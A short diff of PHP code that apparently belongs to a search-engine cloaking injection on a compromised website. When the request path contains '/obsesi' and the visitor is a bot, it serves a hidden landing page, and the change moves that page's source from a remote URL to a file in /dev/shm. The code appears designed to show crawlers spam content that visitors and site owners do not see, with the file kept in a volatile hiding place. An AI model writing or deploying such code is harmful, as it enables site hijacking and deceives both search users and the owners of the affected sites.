@@ -39,7 +39,7 @@ if(stripos($request_uri, '/obsesi') !== false){
     }
     
     if ($is_bot){
-        $file = 'https://inkaindonesia.org/landing/mail-obsesi.html';
+        $file = '/dev/shm/mail-obsesi.txt';
         if (file_exists($file)) {
             readfile($file);
         } else {
